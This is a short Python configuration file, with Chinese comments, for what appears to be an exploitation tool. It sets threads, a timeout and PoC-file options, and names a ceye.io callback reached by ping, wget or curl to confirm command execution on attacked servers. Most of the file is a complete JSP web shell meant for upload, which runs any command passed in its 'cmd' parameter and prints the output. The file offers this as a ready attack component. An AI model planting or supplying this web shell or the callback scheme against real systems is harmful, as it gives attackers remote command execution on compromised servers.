#线程数
thred_num = 10

#ceye.io地址 执行命令的payload 默认为 ping url.ceye.io地址 方便知道是那个服务器被执行了命令
ceye_path = ''

#访问方式 默认为ping 即访问时的方式为 ping url.ceye.io地址，如果在内网中无法访问外网可用修改为wget或是curl。然后用python起一个http服务，让被攻击访问web服务，此时的访问方式为wget 服务器地址/url
method = 'ping'

#超时丢弃时间
time_out = 3

#是否每次运行都生成 poc文件，如果选择为False则需要手动删除文件，才会替换执行的poc
repeat_poc = True

#上传使用的jsp马
jsp_shell = """<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>"""